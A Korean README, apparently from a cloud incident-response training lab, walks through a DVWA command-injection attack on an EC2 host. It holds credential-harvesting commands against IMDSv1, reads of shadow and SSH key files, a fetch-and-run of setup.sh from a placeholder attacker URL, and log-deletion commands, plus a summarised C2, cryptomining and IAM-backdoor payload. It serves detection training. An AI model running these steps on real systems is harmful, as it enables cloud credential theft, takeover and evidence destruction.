#  공격 시나리오: DVWA - Command Injection

## 개요

이 문서는 DVWA(Damn Vulnerable Web Application) 서버에서 **명령어 삽입 취약점(Command Injection)** 을 악용한 공격 시나리오를 설명합니다.  
공격 대상은 **ALB(Application Load Balancer) 뒤에 위치한 EC2 인스턴스**로, 최대한 많은 아티팩트를 수집하기 위한 실험 목적으로 다음과 같은 조건을 갖습니다:

- **웹 서버가 root 권한으로 실행 중**
- **EC2 인스턴스에 과도한 IAM 권한이 부여됨**
- **IMDSv1 (Instance Metadata Service v1)**


> 이 환경은 EC2 인스턴스에 최대 권한이 부여된 상태에서 원격 코드 실행(RCE) 및 권한 상승(LPE)공격에 의해 탈취된 상황을 가정한 실습 및 대응 훈련을 위한 구조입니다.


---

##  공격 시나리오

<img width="960" alt="스크린샷 2025-05-21 21 22 34" src="https://github.com/user-attachments/assets/c4799623-6251-4a4c-ba6e-e683bb19904d" />

### Step 1: 취약점 발견

1. 공격자는 웹 애플리케이션의 입력 필터링이 제대로 이루어지지 않는 것을 발견하고, 명령어 삽입 취약점이 존재함을 확인합니다.
2. 취약한 파라미터를 통해 쉘 명령어를 삽입하고, 이를 통해 웹 서버의 **root 권한**을 획득합니다.

---

### Step 2: 정보 수집

공격자는 루트 쉘 권한을 확보한 이후, 다음과 같은 명령어를 통해 시스템 내부 정보를 수집하고 AWS 환경에 대한 접근을 시도합니다.

---

#### 시스템 정보 수집

```bash
uname -a               # 커널 정보
ifconfig -a            # 네트워크 인터페이스 정보
id                     # 현재 사용자 정보
cat /etc/passwd        # 계정 목록
netstat -rn            # 라우팅 테이블

find / -name .ssh       # SSH 키 파일 위치 탐색
# → GuardDuty 탐지됨: Execution:Runtime/SuspiciousCommand

cat /home/ec2-user/.ssh/authorized_keys  # SSH 공개키 확인
cat /etc/shadow          # 패스워드 해시 열람 시도
cat /etc/hosts           # 로컬 호스트 정보

# 기본 메타데이터 접근 (IMDSv1 만 해당)
curl http://169.254.169.254/
curl http://169.254.169.254/latest/
curl http://169.254.169.254/latest/meta-data

# IAM 정보 및 보안 자격 증명 확인 (IMDSv1 만 해당)
curl http://169.254.169.254/latest/meta-data/iam/info
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

###  Step 3: 악성 페이로드 배포

공격자는 루트 권한을 이용해 시스템에 악성 스크립트를 배포하고, AWS 리소스를 장악하기 위한 후속 작업을 수행합니다. 이 단계에서 공격자는 **클라우드 자원 침투**, **외부 C2 서버와의 통신**, **비트코인 채굴** 등의 악성 행위를 실행합니다.

---
악성 스크립트 다운 및 실행
```bash
wget {atcker_url}/setup.sh
chmod +x setup.sh
./setup.sh
```
___

### 🛠️ setup.sh 요약

- **웹 사용자 정보 탈취**  
  `collect_info.py` 실행을 통해 웹 로그를 분석하고 로그인 시도, 세션 쿠키 등을 수집

- **네트워크 패킷 감청**  
  `pcap.py`를 통해 서버 내에서 발생하는 패킷을 실시간으로 스니핑하여 계정 정보 등 민감 데이터 탈취

- **지속적인 백도어 유지**  
  `C2.py`를 백그라운드에서 실행해 명령 수신 및 원격 제어 가능 상태 유지

- **IAM 사용자 생성 및 AWS 루트 권한 확보**  
  `AdministratorAccess` 권한을 가진 IAM 사용자를 생성하여 AWS 콘솔 및 CLI에 영구 접근 가능

- **비트코인 채굴**  
  `cpuminer`를 설치 및 실행하여 EC2 인스턴스의 CPU 자원을 활용한 암호화폐 채굴 수행

---

### 🧹 Step 4: 증거 로그 삭제 및 은폐

공격자는 침해 행위 이후 자신이 남긴 흔적을 지우기 위해 다음과 같은 **로그 삭제 및 은폐 작업**을 수행합니다. 이는 향후 포렌식 분석을 어렵게 만들며, 침해 사실을 장기간 감출 수 있도록 돕습니다.

---

```bash
history -c && history -w
rm -f ~/.bash_history
unset HISTFILE
rm -f /var/log/messages
rm -f /var/log/secure
rm -f /var/log/auth.log
rm -f /var/log/wtmp
rm -f /var/log/btmp
rm -f /var/log/lastlog
rm -f /var/log/httpd/access_log
rm -f /var/log/httpd/error_log
rm -f setup.sh
rm -rf /tmp/*
```
